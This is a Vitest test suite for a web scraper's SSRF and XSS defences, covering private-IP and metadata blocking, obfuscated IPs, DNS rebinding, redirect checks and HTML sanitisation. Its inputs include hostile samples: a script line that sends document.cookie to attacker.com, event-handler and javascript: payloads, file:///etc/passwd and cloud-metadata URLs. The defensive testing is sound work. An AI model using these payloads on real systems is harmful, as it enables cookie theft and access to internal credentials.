import { describe, it, expect, vi } from "vitest";
import dns from "node:dns";
import {
  isPrivateOrBlockedIp,
  validateSafeUrl,
  validateSafeUrlAsync,
  resolveAndValidateHostname,
  safeFetch,
  sanitizeScrapedHtml,
  sanitizePlainText,
} from "../index";
import { SecuritySSRFError } from "@scrappy/core";

describe("G9 Security & Defense-in-Depth Suite: Scraping & SSRF Hardening", () => {
  describe("1. Private & Blocked IP Subnet Detection", () => {
    it("identifies IPv4 loopback, private, and reserved addresses", () => {
      // Loopback
      expect(isPrivateOrBlockedIp("127.0.0.1")).toBe(true);
      expect(isPrivateOrBlockedIp("127.255.255.255")).toBe(true);

      // RFC 1918 Private ranges
      expect(isPrivateOrBlockedIp("10.0.0.1")).toBe(true);
      expect(isPrivateOrBlockedIp("10.255.255.255")).toBe(true);
      expect(isPrivateOrBlockedIp("172.16.0.1")).toBe(true);
      expect(isPrivateOrBlockedIp("172.31.255.255")).toBe(true);
      expect(isPrivateOrBlockedIp("192.168.0.1")).toBe(true);
      expect(isPrivateOrBlockedIp("192.168.254.254")).toBe(true);

      // Link-local / Cloud Metadata (AWS, GCP, Azure, OpenStack)
      expect(isPrivateOrBlockedIp("169.254.169.254")).toBe(true);
      expect(isPrivateOrBlockedIp("169.254.1.1")).toBe(true);

      // Current network & Broadcast
      expect(isPrivateOrBlockedIp("0.0.0.0")).toBe(true);

      // Carrier-grade NAT (100.64.0.0/10)
      expect(isPrivateOrBlockedIp("100.64.0.1")).toBe(true);
      expect(isPrivateOrBlockedIp("100.127.255.255")).toBe(true);

      // Multicast & Reserved
      expect(isPrivateOrBlockedIp("224.0.0.1")).toBe(true);
      expect(isPrivateOrBlockedIp("240.0.0.1")).toBe(true);

      // Public Valid IPv4 IPs must NOT be blocked
      expect(isPrivateOrBlockedIp("8.8.8.8")).toBe(false);
      expect(isPrivateOrBlockedIp("1.1.1.1")).toBe(false);
      expect(isPrivateOrBlockedIp("142.250.190.46")).toBe(false); // Google
      expect(isPrivateOrBlockedIp("151.101.1.140")).toBe(false); // Reddit
    });

    it("identifies IPv6 loopback, site-local, and mapped IPv4 addresses", () => {
      expect(isPrivateOrBlockedIp("::1")).toBe(true);
      expect(isPrivateOrBlockedIp("::")).toBe(true);
      expect(isPrivateOrBlockedIp("fc00::1")).toBe(true);
      expect(isPrivateOrBlockedIp("fd12:3456:789a::1")).toBe(true);
      expect(isPrivateOrBlockedIp("fe80::1")).toBe(true);

      // IPv4 mapped into IPv6
      expect(isPrivateOrBlockedIp("::ffff:127.0.0.1")).toBe(true);
      expect(isPrivateOrBlockedIp("::ffff:10.0.0.1")).toBe(true);
      expect(isPrivateOrBlockedIp("::ffff:169.254.169.254")).toBe(true);
      expect(isPrivateOrBlockedIp("::ffff:8.8.8.8")).toBe(false);
    });
  });

  describe("2. URL Validation & Obfuscated IP Defense", () => {
    it("blocks dangerous schemes (file, gopher, ftp, javascript, data)", () => {
      expect(() => validateSafeUrl("file:///etc/passwd")).toThrow(SecuritySSRFError);
      expect(() => validateSafeUrl("gopher://127.0.0.1:70/")).toThrow(SecuritySSRFError);
      expect(() => validateSafeUrl("ftp://ftp.example.com/file")).toThrow(SecuritySSRFError);
      expect(() => validateSafeUrl("javascript:alert(1)")).toThrow(SecuritySSRFError);
      expect(() => validateSafeUrl("data:text/html,<h1>Pwned</h1>")).toThrow(SecuritySSRFError);
    });

    it("blocks explicit cloud metadata and loopback hostnames", () => {
      expect(() => validateSafeUrl("http://localhost:8080/secret")).toThrow(SecuritySSRFError);
      expect(() => validateSafeUrl("http://127.0.0.1/admin")).toThrow(SecuritySSRFError);
      expect(() => validateSafeUrl("http://169.254.169.254/latest/meta-data")).toThrow(SecuritySSRFError);
      expect(() => validateSafeUrl("http://metadata.google.internal/computeMetadata/v1/")).toThrow(SecuritySSRFError);
      expect(() => validateSafeUrl("http://instance-data/latest/meta-data")).toThrow(SecuritySSRFError);
    });

    it("blocks numeric, decimal, hex, and octal obfuscated IP hostnames", () => {
      // 2130706433 is 127.0.0.1 in 32-bit decimal notation
      expect(() => validateSafeUrl("http://2130706433/")).toThrow(SecuritySSRFError);
      // 2852039166 is 169.254.169.254 in decimal notation
      expect(() => validateSafeUrl("http://2852039166/latest")).toThrow(SecuritySSRFError);
      // Hex notation 0x7f000001 (127.0.0.1)
      expect(() => validateSafeUrl("http://0x7f000001/")).toThrow(SecuritySSRFError);
    });

    it("permits standard public URLs", () => {
      const url = validateSafeUrl("https://books.toscrape.com/catalogue/category/books_1/index.html");
      expect(url.hostname).toBe("books.toscrape.com");
      expect(url.protocol).toBe("https:");
    });
  });

  describe("3. DNS Rebinding Prevention", () => {
    it("blocks domains resolving to loopback or private ranges", async () => {
      const lookupSpy = vi.spyOn(dns.promises, "lookup").mockResolvedValueOnce([
        { address: "127.0.0.1", family: 4 },
      ]);

      await expect(resolveAndValidateHostname("evil-rebind.attacker.com")).rejects.toThrow(
        /DNS rebinding blocked: Host 'evil-rebind.attacker.com' resolved to private\/blocked IP '127.0.0.1'/,
      );

      lookupSpy.mockRestore();
    });

    it("blocks domains resolving to link-local cloud metadata", async () => {
      const lookupSpy = vi.spyOn(dns.promises, "lookup").mockResolvedValueOnce([
        { address: "169.254.169.254", family: 4 },
      ]);

      await expect(resolveAndValidateHostname("cloud-rebind.attacker.com")).rejects.toThrow(
        /DNS rebinding blocked/,
      );

      lookupSpy.mockRestore();
    });

    it("accepts domains resolving to valid public IP addresses", async () => {
      const lookupSpy = vi.spyOn(dns.promises, "lookup").mockResolvedValueOnce([
        { address: "93.184.216.34", family: 4 },
      ]);

      const ips = await resolveAndValidateHostname("example.com");
      expect(ips).toContain("93.184.216.34");

      lookupSpy.mockRestore();
    });

    it("validates full async pipeline with validateSafeUrlAsync", async () => {
      const lookupSpy = vi.spyOn(dns.promises, "lookup").mockResolvedValueOnce([
        { address: "93.184.216.34", family: 4 },
      ]);

      const parsed = await validateSafeUrlAsync("https://example.com/items");
      expect(parsed.hostname).toBe("example.com");

      lookupSpy.mockRestore();
    });
  });

  describe("4. Safe Fetch Redirect Chain Inspection", () => {
    it("prevents redirect chains that jump to private IP targets", async () => {
      // Mock global fetch to simulate a 302 redirect from a public page to an internal target
      const mockFetch = vi.fn()
        // First hop: returns 302 to 169.254.169.254
        .mockResolvedValueOnce(new Response(null, {
          status: 302,
          headers: { Location: "http://169.254.169.254/latest/meta-data" },
        }));

      vi.stubGlobal("fetch", mockFetch);

      const lookupSpy = vi.spyOn(dns.promises, "lookup").mockResolvedValue([
        { address: "93.184.216.34", family: 4 },
      ]);

      await expect(safeFetch("https://example.com/redirect-to-metadata")).rejects.toThrow(
        SecuritySSRFError,
      );

      lookupSpy.mockRestore();
      vi.unstubAllGlobals();
    });
  });

  describe("5. HTML XSS Sanitization", () => {
    it("neutralizes executable script tags and iframes", () => {
      const dirty = `
        <div class="product-title">
          Sony WH-1000XM5 Headphones
          <script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
          <iframe src="http://attacker.com/evil"></iframe>
          <object data="evil.swf"></object>
          <embed src="evil.swf">
        </div>
      `;
      const clean = sanitizeScrapedHtml(dirty);
      expect(clean).not.toContain("<script>");
      expect(clean).not.toContain("</script>");
      expect(clean).not.toContain("document.cookie");
      expect(clean).not.toContain("<iframe");
      expect(clean).not.toContain("<object");
      expect(clean).not.toContain("<embed");
      expect(clean).toContain("Sony WH-1000XM5 Headphones");
    });

    it("neutralizes inline JavaScript event handlers (onerror, onload, onclick, onmouseover)", () => {
      const dirty = `
        <img src="invalid.jpg" onerror="alert('XSS1')" />
        <a href="https://example.com" onclick="stealData()" onmouseover="logHover()">Click me</a>
        <body onload="initPayload()">
      `;
      const clean = sanitizeScrapedHtml(dirty);
      expect(clean).not.toContain("onerror");
      expect(clean).not.toContain("onclick");
      expect(clean).not.toContain("onmouseover");
      expect(clean).not.toContain("onload");
      expect(clean).toContain('<img src="invalid.jpg" />');
      expect(clean).toContain("Click me");
    });

    it("neutralizes javascript:, vbscript:, and data:text/html protocol attributes", () => {
      const dirty = `
        <a href="javascript:alert(document.domain)">Click to Claim Discount</a>
        <a href="vbscript:msgbox(1)">Visual Basic Link</a>
        <iframe src="data:text/html,<script>alert(1)</script>"></iframe>
      `;
      const clean = sanitizeScrapedHtml(dirty);
      expect(clean).not.toContain("javascript:");
      expect(clean).not.toContain("vbscript:");
      expect(clean).not.toContain("data:text/html");
      expect(clean).toContain("about:blank#blocked-protocol");
    });

    it("escapes special characters in plain text fields using sanitizePlainText", () => {
      const dirty = `<script>alert("XSS & Injection's test")</script>`;
      const clean = sanitizePlainText(dirty);
      expect(clean).toBe("&lt;script&gt;alert(&quot;XSS &amp; Injection&#x27;s test&quot;)&lt;&#x2F;script&gt;");
    });
  });
});
